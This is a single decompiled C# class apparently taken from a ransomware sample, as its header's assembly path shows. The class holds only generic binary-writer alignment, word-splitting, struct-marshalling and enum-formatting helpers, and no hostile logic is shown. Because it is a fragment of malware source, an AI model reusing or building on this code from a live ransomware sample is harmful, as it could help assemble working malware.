// Decompiled with JetBrains decompiler
// Type: ns0.Class15
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: B1CE77B7-43A4-4D0C-BE92-E14F659185D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-46f60653559d396355d4451f8aaea787aea4d3f24f890a0353be6087eb5972ee.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace ns0
{
  internal abstract class Class15
  {
    internal static IntPtr smethod_0(int int_0) => new IntPtr(int_0 + 3 & -4);

    internal static long smethod_1(BinaryWriter binaryWriter_0)
    {
      long position = binaryWriter_0.BaseStream.Position;
      if (position % 2L != 0L)
      {
        long ushort_0 = 2L - position % 2L;
        Class15.smethod_6(binaryWriter_0, (ushort) ushort_0);
        position += ushort_0;
      }
      return position;
    }

    internal static long smethod_2(BinaryWriter binaryWriter_0)
    {
      long position = binaryWriter_0.BaseStream.Position;
      if (position % 4L != 0L)
      {
        long ushort_0 = 4L - position % 4L;
        Class15.smethod_6(binaryWriter_0, (ushort) ushort_0);
        position += ushort_0;
      }
      return position;
    }

    internal static ushort smethod_3(uint uint_0) => (ushort) ((uint_0 & 4294901760U) >> 16);

    internal static ushort smethod_4(uint uint_0) => (ushort) (uint_0 & (uint) ushort.MaxValue);

    internal static void smethod_5(BinaryWriter binaryWriter_0, long long_0, long long_1)
    {
      long position = binaryWriter_0.BaseStream.Position;
      binaryWriter_0.Seek((int) long_1, SeekOrigin.Begin);
      binaryWriter_0.Write((ushort) long_0);
      binaryWriter_0.Seek((int) position, SeekOrigin.Begin);
    }

    internal static long smethod_6(BinaryWriter binaryWriter_0, ushort ushort_0)
    {
      while (ushort_0-- > (ushort) 0)
        binaryWriter_0.Write((byte) 0);
      return binaryWriter_0.BaseStream.Position;
    }

    [SpecialName]
    public static ushort smethod_7() => Class15.smethod_9(0, 0);

    [SpecialName]
    public static ushort smethod_8() => Class15.smethod_9(9, 1);

    public static ushort smethod_9(int int_0, int int_1) => (ushort) ((uint) (ushort) int_1 << 10 | (uint) (ushort) int_0);

    internal static byte[] smethod_10<T>(T gparam_0)
    {
      int length = Marshal.SizeOf((object) gparam_0);
      IntPtr num = Marshal.AllocHGlobal(length);
      Marshal.StructureToPtr((object) gparam_0, num, false);
      byte[] destination = new byte[length];
      Marshal.Copy(num, destination, 0, length);
      Marshal.FreeHGlobal(num);
      return destination;
    }

    internal static List<string> smethod_11<T>(uint uint_0)
    {
      List<string> stringList = new List<string>();
      foreach (T obj in Enum.GetValues(typeof (T)))
      {
        uint uint32 = Convert.ToUInt32((object) obj);
        if ((uint_0 & uint32) > 0U || (int) uint_0 == (int) uint32)
          stringList.Add(obj.ToString());
      }
      return stringList;
    }

    internal static string smethod_12<T>(uint uint_0)
    {
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) Class15.smethod_11<T>(uint_0));
      return string.Join(" | ", stringList.ToArray());
    }
  }
}
